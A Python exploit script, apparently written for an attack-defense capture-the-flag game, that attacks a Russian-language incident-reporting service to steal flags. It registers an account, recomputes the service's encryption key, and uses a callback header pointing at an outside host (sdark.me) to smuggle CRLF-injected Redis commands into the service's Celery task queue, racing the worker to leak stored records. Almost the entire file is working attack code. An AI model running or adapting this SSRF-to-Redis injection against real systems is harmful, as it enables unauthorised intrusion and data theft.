#!/usr/bin/env python3
import base64, hashlib, json, math, os, secrets, sys, time
from email.utils import parsedate_to_datetime
from pathlib import Path
from urllib.error import HTTPError
from urllib.request import Request, urlopen

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

FORCAD_URL = os.environ["FORCAD_URL"].rstrip("/")
CALLBACK_PORT = 18102
REDIS_URL = "http://redis:6379/"
QUEUE, TASK = b"kpp7:tasks:reports", "gate.reports.corroborate"
NOTE_PREFIX = "Сверка межведомственного источника: "
BACKLOG, ATTEMPTS, NOTE_WAIT = 256, 4, 10
MODULUS = 168313682358647251206535970977734992003
COEFFICIENTS = (
    151800895002952766971839610833136494851,
    64001076956537519256855785289131597117,
    150540669344660391194766945067802635779,
    138539125360755762033764250327037755045,
    158177494737148341629350242489920929395,
    131323778890659412545327856505226519667,
    150058023514771764899546918790346553349,
    147587644493504800211730054527292397395,
    81049669821128331811173765782340162129,
    44336149425529302022598267025622887163,
    78725499858738663463708137741217696713,
    63051148126589121798401354497256036789,
    139942099513704143635556049915296968205,
    53171799828785472150022190113710063639,
)
SHIFTS = (48, 15, 45, 61, 24)
ROUNDS = 223
SALT = bytes((
    123, 93, 220, 239, 161, 95, 111, 194, 188, 152, 233, 188,
    53, 38, 27, 253, 95, 228, 32, 140, 219, 253, 28, 160,
))
AAD = bytes((179, 23, 56, 236, 217, 136, 31, 146, 75, 170, 209, 191, 67, 143, 9, 78))


def api(base, path, payload=None, token=None, timeout=12, extra_headers=None):
    headers = {"Accept": "application/json"}
    data = None
    if payload is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(payload).encode()
    if token:
        headers["X-Token"] = token
    if extra_headers:
        headers.update(extra_headers)
    try:
        response = urlopen(Request(base + path, data=data, headers=headers), timeout=timeout)
    except HTTPError as error:
        response = error
    with response:
        body = response.read()
        return response.status, json.loads(body) if body else None


def report(base, token, incident, request_id, summary, callback=None):
    payload = {"summary": summary, "request_id": request_id}
    return api(base, f"/incidents/{incident}/request-corroboration",
               payload, token, timeout=25,
               extra_headers={"X-Report-Route": callback} if callback else None)


def derive_key(epoch):
    c, s = COEFFICIENTS, SHIFTS
    state = (epoch * c[0] + c[1]) % MODULUS
    for index in range(ROUNDS):
        tap = (epoch * c[2] + index * c[3] + c[4]) % MODULUS
        state = (state ^ ((state << s[0]) % MODULUS) ^ tap) % MODULUS
        state = (state + ((state >> s[1]) * c[5]) + c[6]) % MODULUS
        state = ((state * c[7] + index * c[8]) ^ ((state << s[2]) + c[9])) % MODULUS
        state = (state ^ (((state >> s[3]) + c[10]) * c[11])) % MODULUS
        state = (state * c[12] + (epoch ^ c[13]) + index) % MODULUS
        state = (state ^ ((state << s[4]) % MODULUS)) % MODULUS
    epoch_bytes = epoch.to_bytes((epoch.bit_length() + 7) // 8 or 1, "big")
    state_bytes = state.to_bytes((MODULUS.bit_length() + 7) // 8, "big")
    material = bytes((len(epoch_bytes),)) + epoch_bytes + state_bytes + SALT
    return hashlib.sha256(material).digest()


def target_key(base):
    with urlopen(base + "/internal/health", timeout=8) as response:
        dates = response.headers.get_all("Date") or []
        stamp = int(parsedate_to_datetime(dates[-1] if dates else response.headers["Date"]).timestamp())
        uptime = float(response.headers["X-Process-Uptime"])
    return derive_key(math.ceil(stamp - uptime))


def seal_descriptor(value, key):
    nonce = secrets.token_bytes(12)
    plaintext = json.dumps(value, separators=(",", ":"), ensure_ascii=False).encode()
    ciphertext = AESGCM(key).encrypt(nonce, plaintext, AAD)
    return {
        "nonce": base64.urlsafe_b64encode(nonce).rstrip(b"=").decode(),
        "payload": base64.urlsafe_b64encode(ciphertext).rstrip(b"=").decode(),
    }


def redis_frame(command, *args):
    parts = [command.encode(), *args]
    return b"*" + str(len(parts)).encode() + b"\r\n" + b"".join(
        b"$" + str(len(part)).encode() + b"\r\n" + part + b"\r\n"
        for part in parts
    )


def celery_task(incident, record, request_id):
    body = json.dumps([[incident, record, request_id], {}, {}], separators=(",", ":"))
    message = {
        "body": body, "content-encoding": "utf-8", "content-type": "application/json",
        "headers": {"lang": "py", "task": TASK, "id": request_id},
        "properties": {
            "body_encoding": "utf-8",
            "delivery_info": {"exchange": "", "routing_key": "reports"},
            "delivery_tag": request_id[:10],
        },
    }
    return json.dumps(message, separators=(",", ":")).encode()


def callback_report(base, token, incident, command, summary, key):
    descriptor = {
        "method": "GET\r\n" + command.decode("ascii"),
        "url": REDIS_URL,
    }
    name = "route_" + secrets.token_hex(12) + ".json"
    path = Path("/tmp") / name
    # sdark.me returns the AES-GCM envelope for {"method":...,"url":...}.
    path.write_text(
        json.dumps(seal_descriptor(descriptor, key), separators=(",", ":")),
        encoding="utf-8",
    )
    callback = f".sdark.me:{CALLBACK_PORT}/tmp/{name}"
    try:
        return report(base, token, incident, secrets.token_hex(12), summary, callback)
    finally:
        path.unlink(missing_ok=True)


def attack_ids(ip):
    try:
        with urlopen(FORCAD_URL + "/api/client/attack_data/", timeout=8) as response:
            data = json.loads(response.read() or b"null")
    except Exception:
        return []
    records = data.get("propusknaya_sistema", {}).get(ip, []) if isinstance(data, dict) else []
    ids = set()
    for raw in records:
        try:
            item = json.loads(raw) if isinstance(raw, str) else raw
        except (TypeError, ValueError):
            continue
        record = item.get("a") if isinstance(item, dict) and item.get("store") == 2 else None
        if isinstance(record, int) and not isinstance(record, bool):
            ids.add(record)
    return sorted(ids, reverse=True)[:2]


def queue_target(base, token, incident, request_id, summary):
    code, result = report(base, token, incident, request_id, summary)
    if code != 200 or not result or result.get("queued") is not True:
        raise RuntimeError("target report was not accepted")


def run_race(ip, record):
    base = f"http://{ip}:7777"
    key = target_key(base)
    status, account = api(base, "/inspectors/register", {
        "callsign": "poc_" + secrets.token_hex(6),
        "password": secrets.token_urlsafe(18),
    })
    if status != 201:
        raise RuntimeError(f"registration failed: HTTP {status}")
    token = account["token"]
    status, incident_data = api(base, "/incidents", {
        "title": "Сверка квитанции",
        "description": "Изолированная проверка второго флагстора.",
        "priority": "normal",
    }, token)
    if status != 201:
        raise RuntimeError(f"incident creation failed: HTTP {status}")
    incident = incident_data["id"]

    seed = f"for i=1,{BACKLOG} do redis.call('LPUSH',KEYS[1],ARGV[1]) end".encode()
    sha = hashlib.sha1(seed).hexdigest().encode()
    filler = celery_task(incident, record, secrets.token_hex(12))
    callback_report(base, token, incident, redis_frame("SCRIPT", b"LOAD", seed),
                    secrets.token_hex(8), key)
    callback_report(base, token, incident,
                    redis_frame("EVALSHA", sha, b"1", QUEUE, filler),
                    secrets.token_hex(8), key)

    for attempt in range(ATTEMPTS):
        request_id = secrets.token_hex(12)
        summary = secrets.token_hex(8)
        queue_target(base, token, incident, request_id, summary)
        command = redis_frame("LSET", QUEUE, b"0",
                              celery_task(incident, record, request_id))
        callback_report(base, token, incident, command,
                        secrets.token_hex(8), key)

        deadline = time.monotonic() + NOTE_WAIT
        while time.monotonic() < deadline:
            code, current = api(base, f"/incidents/{incident}", token=token)
            if code == 200:
                for note in current.get("notes", []):
                    content = note.get("content", "")
                    if content.startswith(NOTE_PREFIX):
                        value = content[len(NOTE_PREFIX):]
                        value = value.partition(" Приложен документ:")[0].rstrip(".")
                        if value != summary:
                            print(value, flush=True)
                            return True
            time.sleep(0.12)
        print(f"attempt {attempt + 1}: worker beat the replacement", file=sys.stderr)
    return False


def main():
    if len(sys.argv) != 2:
        raise SystemExit("usage: attack_store2.py <target-ip>")
    ip, errors = sys.argv[1], []
    for record in attack_ids(ip):
        try:
            if run_race(ip, record):
                return
        except Exception as error:
            errors.append(str(error))
    if errors:
        print("; ".join(errors), file=sys.stderr)


if __name__ == "__main__":
    main()
